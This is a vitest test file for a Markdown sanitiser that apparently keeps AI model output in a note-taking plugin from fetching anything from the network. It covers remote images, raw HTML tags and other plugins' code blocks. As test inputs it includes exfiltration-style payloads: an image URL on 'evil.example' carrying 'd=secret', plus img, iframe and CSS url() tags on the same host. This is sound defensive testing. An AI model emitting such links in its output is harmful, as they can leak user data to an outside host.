// Model output renders without fetching anything from the network (#137).
import { describe, expect, it } from "vitest";

import { isRemote, withoutPluginCode, withoutRemoteMedia } from "./safeMarkdown";

describe("isRemote", () => {
  it.each(["https://a.example/x.png", "http://a.example", "//a.example/x", "<https://a.example/x>", "ftp://a/x",
           "HTTPS://A.EXAMPLE"])("%s is", (url) => expect(isRemote(url)).toBe(true));
  it.each(["Attachments/x.png", "x.png", "../x.png", "app://local/x.png", "data:image/png;base64,AAAA",
           "C:/Users/x.png", "#heading"])("%s is not", (url) => expect(isRemote(url)).toBe(false));
});

describe("withoutRemoteMedia", () => {
  it("turns an image from the web into a link that fetches nothing until clicked", () => {
    expect(withoutRemoteMedia("See ![chart](https://evil.example/c.png?d=secret) here."))
      .toBe("See [image: chart (not loaded)](https://evil.example/c.png?d=secret) here.");
  });

  it("names the host when the image has no alt text, and keeps a title", () => {
    expect(withoutRemoteMedia('![](https://evil.example/p.png "t")'))
      .toBe('[image: evil.example (not loaded)](https://evil.example/p.png "t")');
    expect(withoutRemoteMedia("![](<https://evil.example/a b.png>)"))
      .toBe("[image: evil.example (not loaded)](<https://evil.example/a b.png>)");
  });

  it("leaves images from the vault alone", () => {
    const text = "![[diagram.png]] and ![a](Attachments/a.png) and ![b](app://local/b.png)";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("turns reference-style images from the web into links, full, collapsed and shortcut", () => {
    const text = "![x][r] ![y][] ![z]\n\n[r]: https://evil.example/r.png\n[y]: https://evil.example/y.png\n[z]: https://evil.example/z.png";
    expect(withoutRemoteMedia(text)).toBe("[image: x (not loaded)][r] [image: y (not loaded)][] [image: z (not loaded)]\n\n"
      + "[r]: https://evil.example/r.png\n[y]: https://evil.example/y.png\n[z]: https://evil.example/z.png");
  });

  it("keeps a reference image whose definition is in the vault", () => {
    const text = "![x][r]\n\n[r]: Attachments/x.png";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("shows raw HTML tags as text, however they are written", () => {
    expect(withoutRemoteMedia('<img src="https://evil.example/x.png">')).toBe('&lt;img src="https://evil.example/x.png">');
    expect(withoutRemoteMedia("<IFRAME src=//evil.example></IFRAME>")).toBe("&lt;IFRAME src=//evil.example>&lt;/IFRAME>");
    expect(withoutRemoteMedia("<video/src=x>")).toBe("&lt;video/src=x>");
    expect(withoutRemoteMedia('<div style="background:url(https://evil.example)">')).toBe('&lt;div style="background:url(https://evil.example)">');
  });

  it("keeps autolinks and comparisons", () => {
    const text = "<https://example.com> <me@example.com> 2 < 3 and a<b";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("leaves fenced code blocks and inline code exactly as written", () => {
    const text = "```html\n<img src=\"https://x.example/a.png\">\n![a](https://x.example/a.png)\n```\n"
      + "Use `<img src=x>` or `![a](https://x.example)` in notes.";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("works again after a code block closes", () => {
    expect(withoutRemoteMedia("~~~\ncode\n~~~\n![a](https://x.example/a.png)"))
      .toBe("~~~\ncode\n~~~\n[image: a (not loaded)](https://x.example/a.png)");
  });

  it("leaves ordinary Markdown alone", () => {
    const text = "# Title\n\n- [link](https://example.com)\n- **bold** and [[Note]]\n\n> quote";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("for a note, turns remote images and tags with a remote address into text, and keeps the user's HTML (#395)", () => {
    expect(withoutRemoteMedia("![a](https://x.example/y.png) ![[local.png]]", "remote"))
      .toBe("[image: a (not loaded)](https://x.example/y.png) ![[local.png]]");
    expect(withoutRemoteMedia('<img src="https://x.example/y.png"> <mark>kept</mark> <a href="https://x.example">l</a>', "remote"))
      .toBe('&lt;img src="https://x.example/y.png"> <mark>kept</mark> <a href="https://x.example">l</a>');
  });
});

describe("withoutPluginCode (#395)", () => {
  const plugin = (language: string): boolean => ["dataviewjs", "dataview", "js-engine"].includes(language);

  it("shows another plugin's block as plain code", () => {
    expect(withoutPluginCode("```dataviewjs\ndv.list()\n```", plugin)).toBe("```text\ndv.list()\n```");
    expect(withoutPluginCode("~~~~js-engine\nreturn 1\n~~~~", plugin)).toBe("~~~~text\nreturn 1\n~~~~");
  });

  it("leaves Obsidian's own blocks and ordinary code alone, even when a plugin registered the language", () => {
    const text = "```base\nviews: []\n```\n```mermaid\na-->b\n```\n```python\nprint()\n```";
    expect(withoutPluginCode(text, () => true).split("\n").filter((l) => l.startsWith("```")))
      .toEqual(["```base", "```", "```mermaid", "```", "```text", "```"]);
    expect(withoutPluginCode(text, plugin)).toBe(text);
  });

  it("does not take a fence inside a block for the start of another", () => {
    const text = "````markdown\n```dataviewjs\nx\n```\n````";
    expect(withoutPluginCode(text, plugin)).toBe(text);
  });

  it("keeps Dataview's inline queries from matching, outside code blocks only", () => {
    const shown = withoutPluginCode("Due `= this.due` and `$= dv.current()`, but `a = b` stays", plugin);
    expect(shown).toBe(`Due \`${ZWSP}= this.due\` and \`${ZWSP}$= dv.current()\`, but \`a = b\` stays`);
    const block = "```js\nconst x = `= y`;\n```";
    expect(withoutPluginCode(block, plugin)).toBe(block);
  });
});

const ZWSP = String.fromCharCode(0x200b);
